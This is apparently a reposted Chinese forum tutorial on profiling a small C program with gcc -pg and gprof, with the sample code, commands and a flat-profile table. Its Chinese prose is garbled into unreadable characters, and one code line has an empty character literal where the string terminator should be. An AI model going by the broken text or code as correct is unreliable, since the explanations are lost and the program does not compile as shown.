Ϊ��˵�����⣬�ڳ����������˺���count_sum()������CPUʱ�䣬�������� 
#include <stdio.h> 

static void my_print (char *); 
static void my_print2 (char *); 

main () 
{ 
char my_string[] = "hello world!"; 
my_print (my_string); 
my_print2 (my_string); 
my_print (my_string); 
} 

void count_sum() 
{ 
int i,sum=0; 
for(i=0; i<1000000; i++) 
sum += i; 
} 

void my_print (char *string) 
{ 
count_sum(); 
printf ("The string is %s ", string); 
} 

void my_print2 (char *string) 
{ 
char *string2; 
int size, i,sum =0; 

count_sum(); 
size = strlen (string); 
string2 = (char *) malloc (size + 1); 
for (i = 0; i < size; i++) string2[size -1 - i] = string[i]; 
string2[size] = ''; 
for(i=0; i<5000000; i++) 
sum += i; 

printf ("The string printed backward is %s ", string2); 
} 
$ gcc -pg -o hello hello.c 
$ ./hello 
$ gprof hello | more 
���������µ���� 
Flat profile: 

Each sample counts as 0.01 seconds. 
% cumulative self self total 
time seconds seconds calls us/call us/call name 
69.23 0.09 0.09 1 90000.00 103333.33 my_print2 
30.77 0.13 0.04 3 13333.33 13333.33 count_sum 
0.00 0.13 0.00 2 0.00 13333.33 my_print 

% ִ�д˺�����ռ�õ�ʱ��ռ������ 
time ִ��ʱ��İٷֱ� 

cumulative �ۼ����� ִ�д˺������ѵ�ʱ�� 
seconds �������˺������������������ѵ�ʱ�䣩 

self ִ�д˺������ѵ�ʱ�� 
seconds �����������������ѵ�ʱ�䲻�������ڣ� 

calls ���ô��� 

self ÿ��ִ�д˺������ѵ�΢��ʱ�� 
us/call 

total ÿ��ִ�д˺��������������������� 
us/call ���ѵ�΢��ʱ�� 

name ������ 

���������ݿ��Կ�����ִ��my_print()��������û����ʲôʱ�䣬�������ֵ����� 
count_sum()�����������ۼ�����Ϊ0.13. 

����: gprof �������������ݺܴ�, �����������Щ���ݵĻ���ð�����ض���һ�� 
�ļ���. 

������Դ��http://www.linuxaid.com.cn/support/showfom.jsp?i=1461 

~��~
http://www.chinaunix.net/forum/viewtopic.php?t=56653
http://www.chinaunix.net/jh/23/56653.html